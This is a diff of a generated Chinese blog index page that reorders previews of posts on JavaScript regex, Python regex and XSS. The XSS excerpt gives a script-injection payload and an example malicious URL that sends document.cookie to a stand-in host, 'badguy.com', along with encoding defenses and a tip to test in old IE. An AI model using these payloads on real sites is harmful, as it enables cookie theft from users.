@@ -633,104 +633,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-JavaScript中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/16/JavaScript中正则的使用/">JavaScript中正则的使用</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/06/16/JavaScript中正则的使用/" class="archive-article-date">
-  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="JavaScript正则的使用"><a href="#JavaScript正则的使用" class="headerlink" title="JavaScript正则的使用"></a>JavaScript正则的使用</h2><ol>
-<li>可以用正则的方法<ol>
-<li><code>reg.exec(str);</code>返回查找的字符串或null,但是只能匹配一次不能全局匹配;返回一个数组,包含匹配到的字符串和分组规则匹配的值</li>
-<li><code>reg.test(str);</code>返回true或false</li>
-<li><code>str.match(reg);</code>返回查找的字符串数组或null,匹配一个;加g时才返回标准数组;不加g时返回类数组包含结果和子集</li>
-<li><code>str.replace(reg , str1);</code>str1可以用函数代替<code>function(a,b,c,d){}</code>a: 匹配内容 b: 匹配的子集 c:匹配内容出现的序号 d: 整体str</li>
-<li><code>str.search(reg);</code>返回查找匹配字符串首次出现的下标或-1</li>
-<li><code>str.split(reg);</code></li></ol></li></ol>
-        
-          <a class="article-more-a" href="/blog/2018/06/16/JavaScript中正则的使用/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">JavaScript</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">正则</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/JavaScript//" class="article-tag-list-link color1">JavaScript</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/16/JavaScript中正则的使用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-python中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -841,35 +743,36 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-JavaScript中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+      <a class="article-title" href="/blog/2018/06/16/JavaScript中正则的使用/">JavaScript中正则的使用</a>
     </h1>
   
 
         
-        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
-  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
+        <a href="/blog/2018/06/16/JavaScript中正则的使用/" class="archive-article-date">
+  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
-<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
-<li>将用户输入的字符进行HTML Encode转码</li>
-<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
-<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li></ol>
+        <h2 id="JavaScript正则的使用"><a href="#JavaScript正则的使用" class="headerlink" title="JavaScript正则的使用"></a>JavaScript正则的使用</h2><ol>
+<li>可以用正则的方法<ol>
+<li><code>reg.exec(str);</code>返回查找的字符串或null,但是只能匹配一次不能全局匹配;返回一个数组,包含匹配到的字符串和分组规则匹配的值</li>
+<li><code>reg.test(str);</code>返回true或false</li>
+<li><code>str.match(reg);</code>返回查找的字符串数组或null,匹配一个;加g时才返回标准数组;不加g时返回类数组包含结果和子集</li>
+<li><code>str.replace(reg , str1);</code>str1可以用函数代替<code>function(a,b,c,d){}</code>a: 匹配内容 b: 匹配的子集 c:匹配内容出现的序号 d: 整体str</li>
+<li><code>str.search(reg);</code>返回查找匹配字符串首次出现的下标或-1</li>
+<li><code>str.split(reg);</code></li></ol></li></ol>
         
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/#more">more >></a>
+          <a class="article-more-a" href="/blog/2018/06/16/JavaScript中正则的使用/#more">more >></a>
         
       
 
@@ -883,11 +786,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">JavaScript</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">正则</a>
         		</li>
       		
 		</ul>
@@ -899,7 +802,7 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        			<a href="/blog/categories/JavaScript//" class="article-tag-list-link color1">JavaScript</a>
         		</li>
       		
 		</ul>
@@ -908,7 +811,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2018/06/16/JavaScript中正则的使用/">展开全文 >></a>
         </p>
       
 
@@ -1004,6 +907,103 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/06/12/OSI七层模型结构/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
+  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
+<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
+<li>将用户输入的字符进行HTML Encode转码</li>
+<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
+<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li></ol>
+        
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
         </p>
       
 
@@ -1270,15 +1270,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">电影</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">网络</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">安全性测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">电影</a>
               </li>
             
             <div class="clearfix"></div>
